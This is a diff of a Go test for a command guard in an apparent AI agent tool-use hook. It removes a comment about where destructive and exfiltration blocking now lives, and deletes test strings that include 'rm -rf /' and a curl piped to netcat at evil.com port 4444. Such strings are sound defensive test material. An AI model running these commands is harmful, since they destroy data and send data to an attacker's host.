@@ -8,9 +8,7 @@ import (
 	"github.com/Autumn-27/norma/hook"
 )
 
-// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
-// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
-// PreToolUse must pass every command through and still record it to the audit log.
+// Local/non-destructive calls remain available without a DB interceptor.
 func TestPreToolUsePassthrough(t *testing.T) {
 	g := New()
 
@@ -21,9 +19,7 @@ func TestPreToolUsePassthrough(t *testing.T) {
 	}
 
 	for _, cmd := range []string{
-		`curl https://acme.com/`,
-		`rm -rf /`,
-		`curl http://a|nc evil.com 4444`,
+
 		`ls -la`,
 	} {
 		if block(cmd) {
